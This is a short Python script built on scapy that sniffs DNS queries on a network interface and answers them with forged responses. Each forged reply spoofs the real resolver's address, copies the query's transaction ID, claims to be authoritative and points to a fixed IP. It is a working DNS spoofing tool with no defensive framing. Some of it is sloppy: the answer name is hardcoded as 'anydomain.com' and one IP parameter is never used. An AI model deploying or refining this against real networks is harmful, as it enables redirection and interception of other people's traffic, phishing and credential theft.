import scapy.all as scapy

def send_dns_response(client_ip, client_port, dest_ip, domain, ip_address, transaction_id, Interface):
    # Google's IP address for the response
    URL_Destination = "142.250.217.68"  # Replace with any IP you want to use, like Google's

    # Craft the IP layer
    ip = scapy.IP(src=dest_ip, dst=client_ip)  # Adjust source IP if needed
    
    # Craft the UDP layer
    udp = scapy.UDP(sport=53, dport=client_port)
    
    # Craft the DNS response layer
    dns = scapy.DNS(
        id=transaction_id,
        qr=1,        # Set to 1 for response
        opcode=0,
        aa=1,        # Authoritative answer
        tc=0,
        rd=0,
        ra=0,
        z=0,
        rcode=0,
        qdcount=1,
        ancount=1,
        qd=scapy.DNSQR(qname="anydomain.com"),  # Placeholder, ignored in response
        an=scapy.DNSRR(rrname="anydomain.com", ttl=3600, rdata=URL_Destination)
    )
    
    # Stack layers to form the final packet
    response_packet = ip / udp / dns

    print(f"{client_ip},{domain}")
    
    # Send the packet
    scapy.send(response_packet, iface=Interface , verbose = False)

def dns_request_handler(packet, ip_address, Interface):
    # Check if packet has DNS layer and is a query
    if packet.haslayer(scapy.DNS) and packet[scapy.DNS].qr == 0:
        client_ip = packet[scapy.IP].src
        client_port = packet[scapy.UDP].sport
        domain = packet[scapy.DNSQR].qname.decode("utf-8")  # Decode bytes to string
        transaction_id = packet[scapy.DNS].id
        dest_ip = packet[scapy.IP].dst  # IP the client sent the request to
        
        # Define the IP address to respond with
        ip_address = "8.8.8.8"  # Replace with desired IP
        
        # Call function to send DNS response
        send_dns_response(client_ip, client_port, dest_ip, domain, ip_address, transaction_id, Interface)

def start_sniffing(ip_address, Interface):
    scapy.sniff(filter="udp port 53", 
            prn=lambda packet: dns_request_handler(packet, ip_address, Interface),
            iface=Interface)